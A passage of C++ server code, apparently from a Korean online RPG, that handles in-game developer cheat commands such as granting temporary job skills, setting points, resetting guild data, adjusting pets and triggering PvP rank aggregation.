							// 팔라딘 -> 가디언
							case 41:
								{
									pPlayerActor->AddTempSkill( 3301 );	// 오토 블록 ex
									pPlayerActor->AddTempSkill( 3302 );	// 가디언 포스
									pPlayerActor->AddTempSkill( 3303 );	// 저스티스 크래쉬
								}
								break;

							// 팔라딘 -> 크루세이더
							case 42:
								{
									pPlayerActor->AddTempSkill( 3351 );	// 저지스 파워
									pPlayerActor->AddTempSkill( 3352 );	// 홀리 크로스 ex
									pPlayerActor->AddTempSkill( 3353 );	// 저지먼트 해머
								}
								break;

							// 프리스트 -> 세인트
							case 43:
								{
									pPlayerActor->AddTempSkill( 3501 );	// 홀리 쉴드
									pPlayerActor->AddTempSkill( 3502 );	// 렐릭 오브 라이트닝 ex
									pPlayerActor->AddTempSkill( 3503 );	// 쇼크 오브 렐릭
								}
								break;

							// 프리스트 -> 인퀴지터
							case 44:
								{
									pPlayerActor->AddTempSkill( 3551 );	// 쇼크 트랜지션
									pPlayerActor->AddTempSkill( 3552 );	// 라이트닝 볼트 ex
									pPlayerActor->AddTempSkill( 3553 );	// 컨스크레이션
								}
								break;

							// 엔지니어 -> 슈팅스타
							case 47:
								{
									pPlayerActor->AddTempSkill( 4301 );	// 스플래쉬
									pPlayerActor->AddTempSkill( 4302 ); // 핑퐁밤 EX
									pPlayerActor->AddTempSkill( 4303 ); // 알프레도 빔
								}
								break;

							// 엔지니어 -> 기어 마스터
							case 48:
								{
									pPlayerActor->AddTempSkill( 4351 ); // 체인소우 타워
									pPlayerActor->AddTempSkill( 4352 );	// 메카덕 EX
									pPlayerActor->AddTempSkill( 4353 ); // 빅 메카 붐버
								}
								break;

							// 알케미스트 -> 어뎁트
							case 50:
								{
									pPlayerActor->AddTempSkill( 4501 ); // C2H5OH
									pPlayerActor->AddTempSkill( 4502 ); // 마그마 펀치 EX
									pPlayerActor->AddTempSkill( 4503 ); // 아이스 빔
								}
								break;

							// 알케미스트 -> 피지션
							case 51:
								{
									pPlayerActor->AddTempSkill( 4551 ); // 러브 바이러스
									pPlayerActor->AddTempSkill( 4552 ); // 인젝터 EX
									pPlayerActor->AddTempSkill( 4553 );	// 힐 샤워
								}
								break;
							}
						}

						// 먼저 임시 스킬부터 추가하고 임시 전직하도록 클라에 보내줘야 클라에서 제대로 스킬트리가
						// 초기화 된다.
						pPlayerActor->SendTempJobChange( iJobID );
					}
				}
#endif
			}
			break;

		case CLEAR_SECOND_JOB_SKILL:
			{
#ifdef _VILLAGESERVER
				wstring wszString = FormatW(L"게임서버에서만 사용 가능한 2차전직 스킬 임시로 얻는 치트키.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );

				return false;
#else

				CDnPlayerActor* pPlayerActor = m_pSession->GetPlayerActor();
				if( pPlayerActor )
				{
					// 클라쪽으로도 패킷 나감.
					pPlayerActor->RemoveAllTempSkill();
					pPlayerActor->EndAddTempSkillAndSendRestoreTempJobChange();
				}
#endif
			}
			break;
		case MAKE_UNION_POINT:
			{
				if( tokens.size() <= 2 )
					return false;

				int nUnionType = _ttoi(tokens[1].c_str());

				BYTE cPointType = DBDNWorldDef::EtcPointCode::None;
				switch(nUnionType)
				{
				case NpcReputation::UnionType::Commercial:	
					cPointType = DBDNWorldDef::EtcPointCode::Union_Commercial;
					break;
				case NpcReputation::UnionType::Liberty:		
					cPointType = DBDNWorldDef::EtcPointCode::Union_Liberty;
					break;
				case NpcReputation::UnionType::Royal:		
					cPointType = DBDNWorldDef::EtcPointCode::Union_Royal;
					break;
				default:
					return false;
				}
				
				m_pSession->AddEtcPoint(cPointType, _ttoi(tokens[2].c_str()));

			}
			break;

		case CMDEQUIPTRIGGER:
		{
#if defined( _GAMESERVER )
			if( tokens.size() <= 2 )
				return false;

			api_trigger_InvenToEquip( m_pSession->GetGameRoom(), m_pSession->GetSessionID(), _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()) ? true : false );
#endif // #if defined( _GAMESERVER )
			break;
		}
		case CMDUNRIDE:
		{
#if defined( _GAMESERVER )
			api_trigger_UnRideVehicle( m_pSession->GetGameRoom(), m_pSession->GetSessionID() );
#endif // #if defined( _GAMESERVER )
			break;
		}

		case ITEMEXPIREDATE:
			{
				if( tokens.size()  <= 1 ) return false;
				INT64 biSerial = _wtoi64(tokens[1].c_str());				
				
				m_pSession->GetItem()->ItemExpireByCheat( biSerial );
			}
			break;

		case UPDATE_PET_EXP:
			{
				if( tokens.size() <= 1) return false;
				int nExp = _wtoi(tokens[1].c_str());
				m_pSession->GetItem()->UpdatePetExp(nExp);

			}
			break;

		case SET_PET_COLOR:
			{
				if( tokens.size()  <= 2 ) return false;
				int nType = _wtoi(tokens[1].c_str()); // 펫 컬러 변경 부위
				int nColor = _wtoi(tokens[2].c_str());  // 컬러값
				if( 1 == nType )
					m_pSession->GetItem()->ChangePetBodyColor(&nColor);	//body color
				else
					m_pSession->GetItem()->ChangePetNoseColor(&nColor);	//tatoo color
			}
			break;

		case PERIODRESET:
			{
				if( tokens.size()  <= 1 ) return false;
				int nType = _wtoi(tokens[1].c_str()); // type

				// 사용 횟수 0 으로 
				m_pSession->ModCommonVariableData((CommonVariable::Type::eCode)nType, 0);
			}
			break;

		case MAKEGITEM:
			{
#ifdef _GAMESERVER
				if( tokens.size() < 2 ) return false;
				CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
				if( !pGameRoom ) return false;
				if( !pGameRoom->GetGameTask() ) return false;
				DNVector(CDnItem::DropItemStruct) VecList;
				CDnDropItem::CalcDropItemList( pGameRoom, pGameRoom->GetGameTask()->GetStageDifficulty(), _wtoi(tokens[1].c_str()), VecList );

				CDnItemTask *pTask = (CDnItemTask *)pGameRoom->GetTaskMng()->GetTask( "ItemTask" );
				if(!pTask) return false;
				for( DWORD j=0; j<VecList.size(); j++ ) {
#if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD)
					pTask->RequestDropItem( VecList[j].dwUniqueID, *(m_pSession->GetActorHandle()->GetPosition()), VecList[j].nItemID, VecList[j].nSeed, 1, (short)( _rand(pGameRoom)%360 ), -1, VecList[j].nEnchantID);
#else	// #if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD)
					pTask->RequestDropItem( VecList[j].dwUniqueID, *(m_pSession->GetActorHandle()->GetPosition()), VecList[j].nItemID, VecList[j].nSeed, 1, (short)( _rand(pGameRoom)%360 ));
#endif	// #if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD)
				}
#endif
			}
			break;
		case FARM_GUILDWAR_FINAL:
		{
#if defined( _GAMESERVER )
			CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
			if( pGameRoom->bIsFarmRoom() )
			{
				static_cast<CDNFarmGameRoom*>(pGameRoom)->OnStartGuildWarFinal();
			}
#endif // #if defined( _GAMESERVER )
			break;
		}
		case DESTROYPVP:
			{
				if( tokens.size() < 2 ) return false;
#if defined(_VILLAGESERVER)
				g_pMasterConnection->SendForceDestroyPvP(m_pSession->GetAccountDBID(), _wtoi(tokens[1].c_str()), tokens.size() > 2 ? tokens[2].c_str() : NULL);
#endif		//#if defined(_VILLAGESERVER)
				break;
			}
		case CLEAR_MISSION :
			{
#if defined(_VILLAGESERVER)
				m_pSession->GetDBConnection()->QueryDelAllMissionsForCheat( m_pSession );					
#else
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );	
#endif
			}
			break;
		case CLEAR_PRESENT :
			{
#if defined(_VILLAGESERVER)
				m_pSession->GetDBConnection()->QueryCheatGiftClear(m_pSession);
#else
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );	
#endif
			}
			break;

		case SHOP_GETLIST_REPURCHASE:
			{
#if defined( _VILLAGESERVER )
				m_pSession->OnRecvTradeMessage( eTrade::CS_SHOP_GETLIST_REPURCHASE, NULL, 0 );
#endif // #if defined( _VILLAGESERVER )
				break;
			}

		case SHOP_REPURCHASE:
			{
#if defined( _VILLAGESERVER )
				if( tokens.size() < 2 ) 
					return false;
				CSShopRepurchase TxPacket;
				memset( &TxPacket, 0, sizeof(TxPacket) );

				TxPacket.iRepurchaseID = _wtoi(tokens[1].c_str());

				m_pSession->OnRecvTradeMessage( eTrade::CS_SHOP_REPURCHASE, reinterpret_cast<char*>(&TxPacket), sizeof(TxPacket) );
#endif // #if defined( _VILLAGESERVER )
				break;
			}

#if defined(PRE_ADD_QUICK_PVP)
		case QUICKPVP :
			{
				if( tokens.size() < 2)
					return false;
#if defined(_VILLAGESERVER)
				CDNUserSession* pUser = g_pUserSessionManager->FindUserSessionByName(tokens[1].c_str());
				if( pUser )
				{
					g_pMasterConnection->SendMakeQuickPvPRoom(m_pSession->GetAccountDBID(), pUser->GetAccountDBID());
				}					
#endif // #if defined(_VILLAGESERVER)					
			}
			break;
#endif //#if defined(PRE_ADD_QUICK_PVP)

		case PVPTIMEOVER:
			{
#if defined( _GAMESERVER ) && !defined( _FINAL_BUILD )
				CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
				if( pGameRoom->bIsPvPRoom() == false )
					break;
				CDNPvPGameRoom* pPvPGameRoom = static_cast<CDNPvPGameRoom*>(pGameRoom);
				if( pPvPGameRoom->GetPvPGameMode() )
					pPvPGameRoom->GetPvPGameMode()->SetForceTimeOver();
#endif // #if defined( _GAMESERVER )
				break;
			}

		case RESETNESTCOUNT:
			{
				m_pSession->InitNestClear(true);

			}
			break;
		case DEL_GUILDEFFECT:
			{
				if( tokens.size() < 2 ) 
					return false;
				int nItemID = _wtoi(tokens[1].c_str());
				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) 
				{
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif

				TGuildRewardItem *RewardItemInfo;
				RewardItemInfo = pGuild->GetGuildRewardItem();
				for(int i = GUILDREWARDEFFECT_TYPE_EXTRAEXP; i < GUILDREWARDEFFECT_TYPE_CNT; i++)
				{
					if( RewardItemInfo[i].nItemID == nItemID )
					{
						m_pSession->GetDBConnection()->QueryCheatDelGuildEffectItem( m_pSession->GetDBThreadID(), m_pSession->GetWorldSetID(), m_pSession->GetAccountDBID(), m_pSession->GetCharacterDBID(), GuildUID.nDBID, nItemID );
						m_pSession->GetDBConnection()->QueryGetGuildRewardItem( m_pSession->GetDBThreadID(), GuildUID.nWorldID, 0, GuildUID.nDBID );
						return true;
					}
				}
				wstring wszString = FormatW(L"존재하지 않는 효과입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
			}
			break;
		case DEL_GUILDMARK:
			{
				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) 
				{
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif

				m_pSession->GetDBConnection()->QueryChangeGuildMark(m_pSession->GetDBThreadID(),  m_pSession->GetAccountDBID(), m_pSession->GetCharacterDBID(), m_pSession->GetGuildSelfView().GuildUID.nDBID, 
					m_pSession->GetWorldSetID(), 0, 0, 0);
			}
			break;
		case DENY_GUILDRECRUIT:
			{
#if defined(_VILLAGESERVER)
				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) 
				{
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}
				m_pSession->GetDBConnection()->QueryCheatDelGuildRecruit(m_pSession, GuildUID.nDBID, 1 );
#else
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );	
#endif				
			}
			break;
		case CANCEL_GUILDAPPLY:
			{
#if defined(_VILLAGESERVER)				
				m_pSession->GetDBConnection()->QueryCheatDelGuildRecruit(m_pSession, 0, 2 );
#else
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif
			}
			break;
		case RESET_GUILDPOINTLIMIT:
			{
				const TGuildUID GuildUID = m_pSession->GetGuildUID();
				if(!GuildUID.IsSet()) 
				{
					wstring wszString = FormatW(L"길드에 가입된 상태가 아닙니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

				CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
				if(!pGuild) 
				{
					wstring wszString = FormatW(L"길드정보가 존재하지 않습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}

#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if(FALSE == pGuild->IsEnable()) break;
#endif

				m_pSession->GetDBConnection()->QueryModGuildCheat(m_pSession->GetDBThreadID(), pGuild->GetUID().nWorldID, pGuild->GetUID().nDBID, 2, 0, 0);
			}
			break;
#if defined(PRE_ADD_PVP_VILLAGE_ACCESS)
		case PVP_VILLAGE_JOIN :
			{


			}
			break;
		case PVP_VILLAGE_LADDER :
			{

			}
			break;
#endif
#if defined(PRE_ADD_EXPORT_DPS_INFORMATION)
		case ENABLE_DPS_REPORT :
			{
#if defined(_GAMESERVER)
				if( tokens.size() < 2 ) 
					return false;
				
				bool bEnable = (_wtoi(tokens[1].c_str()) != 0) ? true : false;

				if(CDnDPSReporter::IsActive())
				{
					if(bEnable)
					{
						if( !CDnDPSReporter::GetInstance().IsEnabledUser(m_pSession->GetCharacterDBID()) )
						{
							if( CDnDPSReporter::GetInstance().EnableUser( m_pSession->GetCharacterDBID() ) == true )
							{
								CDnDPSReporter::GetInstance().ReportUserInfo( m_pSession->GetActorHandle() );
								wstring wszString;
								wszString = FormatW(L" [%s] 의 DPS 기록을 시작합니다 (User %d / %d) )" , m_pSession->GetCharacterName() , CDnDPSReporter::GetInstance().GetEnabledUserCount() , CDnDPSReporter::eReport::MaxUserCount );
								g_pMasterConnectionManager->SendNoticeFromClinet((WCHAR*)wszString.c_str(), (int)wszString.size()*sizeof(WCHAR) );
							}
							else
							{
								wstring wszString;
								wszString = FormatW(L" 서버의 DPSREPORT 사용유저가 초과되었습니다. (MAX %d) \n ( /reportdps 0 : 기존 DPS사용 유저 초기화 )" , CDnDPSReporter::eReport::MaxUserCount );
								m_pSession->SendChat( CHATTYPE_NOTICE, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
								return false;
							}
						}
					}
					else
					{
						CDnDPSReporter::GetInstance().DisableAllUser();
						wstring wszString;
						wszString = FormatW(L" DPSREPORT 사용유저를 모두 초기화 합니다." );
						g_pMasterConnectionManager->SendNoticeFromClinet((WCHAR*)wszString.c_str(), (int)wszString.size()*sizeof(WCHAR) );
					}
				}
#else
				return false;
#endif	// #if defined(_GAMESERVER)
			}
			break;
#endif
#if defined( PRE_ADD_NAMEDITEM_SYSTEM ) 
		case GOLDBOX_NAMEDITEM:
			{
#if defined( _GAMESERVER )
				wstring wszString;

				if( tokens.size() < 2 ){
					wszString = FormatW(L"아이템아이디를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				int nItemID = _wtoi(tokens[1].c_str());
				if( nItemID != 0 )
				{
					TItemData *pItemData = g_pDataManager->GetItemData(nItemID);
					if (!pItemData)
					{
						wszString = FormatW(L"아이템아이디를 제대로 입력해주세요!!!\r\n");
						m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
						return false;
					}
					else if( pItemData->cRank != ITEMRANK_SSS )
					{
						wszString = FormatW(L"아이템 랭크가 맞지 않습니다.!!!\r\n");
						m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
						return false;
					}
				}
				
				m_pSession->SetGoldBoxItemID( nItemID );

				g_Log.Log(LogType::_NORMAL, m_pSession, L"SET_GOLDBOXITEMID : %d ", nItemID);
#else
				wstring wszString = FormatW(L"게임서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif
			}
			break;

		case NAMEDITEM_COUNT:
			{
				wstring wszString;

				if( tokens.size() < 2 ){
					wszString = FormatW(L"아이템아이디를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				int nItemID = _wtoi(tokens[1].c_str());
				if( nItemID != 0 )
				{
					TItemData *pItemData = g_pDataManager->GetItemData(nItemID);
					if (!pItemData)
					{
						wszString = FormatW(L"아이템아이디를 제대로 입력해주세요!!!\r\n");
						m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
						return false;
					}
					else if( pItemData->cRank != ITEMRANK_SSS )
					{
						wszString = FormatW(L"아이템아이디를 제대로 입력해주세요!!!\r\n");
						m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
						return false;
					}
					m_pSession->GetDBConnection()->QueryCheatCheckNamedItemCount( m_pSession, pItemData->nItemID, 0 );
					//m_pSession->GetDBConnection()->quergetname( nItemID );
				}
				else
				{
					wszString = FormatW(L"아이템아이디를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}				
			}
			break;
#endif

#if defined(PRE_ADD_LIMITED_CASHITEM)
		case CHANGE_LIMITQUANTITY:
			{
#if defined( _VILLAGESERVER )
				wstring wszString;

				if( tokens.size() < 3 ){
					wszString = FormatW(L"아이템시리얼과 변경 숫자를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				int nItemSN = _wtoi(tokens[1].c_str());
				int nLimitMax = _wtoi(tokens[2].c_str());
				if( nItemSN != 0 )
				{
					TCashCommodityData CashData;
					if (!g_pDataManager->GetCashCommodityData(nItemSN, CashData))
					{
						wszString = FormatW(L"아이템시리얼을 제대로 입력해주세요!!!\r\n");
						m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					}
					else
					{
						if (g_pCashConnection)
							g_pCashConnection->SendCheatChangeLimitMax(nItemSN, nLimitMax);
					}
				}
#else		//#if defined( _VILLAGESERVER )
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif		//#if defined( _VILLAGESERVER )
			}
			break;
#endif		//#if defined(PRE_ADD_LIMITED_CASHITEM)
#if defined (PRE_ADD_BESTFRIEND)
		case CLOSE_BESTFRIEND:
			{
#if defined( _VILLAGESERVER )
				wstring wszString;

				if(!m_pSession->GetBestFriend()->IsRegistered())
				{
					wszString = FormatW(L"절친 상태가 아닙니다.!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				m_pSession->GetBestFriend()->CheckStatus(true);
#else
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif
			}
			break;
#endif // #if defined (PRE_ADD_BESTFRIEND)
#if defined (PRE_ADD_RACING_MODE)
		case RACING_START :
			{
#if defined(_GAMESERVER)				
				if( m_pSession->GetGameRoom()->GetPvPGameMode()->bIsRacingMode() )				
					api_trigger_GetRacingStartTime(m_pSession->GetGameRoom());				
#endif
			}
			break;
		case RACING_END :
			{
#if defined(_GAMESERVER)
				if( m_pSession->GetGameRoom()->GetPvPGameMode()->bIsRacingMode() && tokens.size() == 2 )		
				{
					int nPartyIndex = _wtoi(tokens[1].c_str());
					//api_trigger_GetRacingGoalTime(m_pSession->GetGameRoom(), nPartyIndex);
				}
#endif
			}
			break;
#endif
#if defined(PRE_ADD_PCBANG_RENTAL_ITEM)
		case SETPCCAFERENTITEM :
			{
#if defined(_VILLAGESERVER)
				UINT nUserID =  m_pSession->GetObjectID();
				api_user_SetPCCafeItem(nUserID);
#endif
			}
			break;
#endif
#ifdef PRE_MOD_PVPRANK
		case RANK:
			{
				BYTE cThreadID;
				CDNDBConnection *pDBCon = static_cast<CDNDBConnection*>(g_pDBConnectionManager->GetDBConnection(cThreadID));
				if (pDBCon)
				{
					pDBCon->QueryCalcPvPRank(cThreadID);
					wstring wszString = FormatW(L"PvP Rank계산 요청을 하였습니다. 재로그인 해주세요.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
			}
			break;
#endif		//#ifdef PRE_MOD_PVPRANK
#if defined(PRE_ADD_PVP_RANKING)
		case PVP_RANK:
			{
				BYTE cThreadID;
				CDNDBConnection *pDBCon = static_cast<CDNDBConnection*>(g_pDBConnectionManager->GetDBConnection(cThreadID));
				if (pDBCon)
				{
					pDBCon->QueryAggregatePvPRank(m_pSession, false);
					wstring wszString = FormatW(L"PvP Rank 집계 요청을 하였습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
			}
			break;
		case PVP_LADDER_RANK:
			{
				BYTE cThreadID;
				CDNDBConnection *pDBCon = static_cast<CDNDBConnection*>(g_pDBConnectionManager->GetDBConnection(cThreadID));
				if (pDBCon)
				{
					pDBCon->QueryAggregatePvPRank(m_pSession, true);
					wstring wszString = FormatW(L"PvP Ladder Rank 집계 요청을 하였습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					break;
				}
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
			}
			break;
#endif	//#if defined(PRE_ADD_PVP_RANKING)

#if defined(PRE_SPECIALBOX)
		case SPECIALBOX:
			{
				wstring wszString;

				if( tokens.size() < 2 ){
					wszString = FormatW(L"메일테이블 아이디를 제대로 입력해주세요!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				int nMailID = _wtoi(tokens[1].c_str());
				if (nMailID > 0){
					CDNMailSender::Process(m_pSession, nMailID, DBDNWorldDef::PayMethodCode::Admin, nMailID);
				}				
			}
			break;
#endif	// #if defined(PRE_SPECIALBOX)

#if defined(PRE_ADD_REMOTE_QUEST)
		case GAIN_REMOTE_QUEST:
			{
				wstring wszString;
				if( tokens.size() < 2 ){
					wszString = FormatW(L"퀘스트아이디를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				int nQuestID = _wtoi(tokens[1].c_str());

				m_pSession->GetQuest()->AddRemoteQuestToAcceptWaitList(nQuestID);
			}
			break;
		case ACCEPT_REMOTE_QUEST:
			{
				wstring wszString;
				if( tokens.size() < 2 ){
					wszString = FormatW(L"퀘스트아이디를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				int nQuestID = _wtoi(tokens[1].c_str());

				m_pSession->GetQuest()->AcceptRemoteQuest(nQuestID);
			}
			break;			
		case COMPLETE_REMOTE_QUEST:
			{
				wstring wszString;
				if( tokens.size() < 2 ){
					wszString = FormatW(L"퀘스트아이디를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				int nQuestID = _wtoi(tokens[1].c_str());
				m_pSession->GetQuest()->SetQuestToRecompenseState(nQuestID);
				m_pSession->SendCompleteRemoteQuest(nQuestID);
			}
			break;			
#endif
#if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD) && defined(_GAMESERVER)
		case SET_STAGE_CLEAR_BOXNUM:
			{
				wstring wszString;
				if( tokens.size() > 2){
					wszString = FormatW(L"아이템 드랍 그룹 번호 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				m_pSession->SetBoxNumber(_wtoi(tokens[1].c_str()));
			}
			break;
#endif	// #if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD) && defined(_GAMESERVER)
		case ISGAINMISSION:
			{
				wstring wszString;
				if( tokens.size() < 2 ){
					wszString = FormatW(L"미션아이디를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				int nMissionID = _wtoi(tokens[1].c_str());
				DNTableFileFormat *pSox = GetDNTable( CDnTableDB::TMISSION );
				int nTargetArrayIndex = pSox->GetArrayIndex( nMissionID );

				if( GetBitFlag(m_pSession->GetMissionData()->MissionGain, nTargetArrayIndex) )
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wcslen(L"획득!\r\n"), L"", (L"획득!\r\n"));
				else
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wcslen(L"미획득\r\n"), L"", (L"미획득\r\n"));
				
			}
			break;
#if defined( PRE_ADD_STAMPSYSTEM )
		case ADD_STAMP:
			{
				wstring wszString;
				if( tokens.size() < 3 )
				{
					wszString = FormatW(L"사용방법이 올바르지 않습니다!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				int nChallengeIndex = _wtoi(tokens[1].c_str());
				int nWeekDay = _wtoi(tokens[2].c_str());

				if( 0 == nChallengeIndex || 
					StampSystem::Common::MaxChallengeCount < nChallengeIndex || 
					0 == nWeekDay ||
					StampSystem::Common::MaxWeekDayCount < nWeekDay )
				{
					wszString = FormatW(L"입력값의 범위가 잘못 되었습니다!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				m_pSession->GetStampSystem()->ForceAddCompleteSlot( nChallengeIndex, nWeekDay );
			}
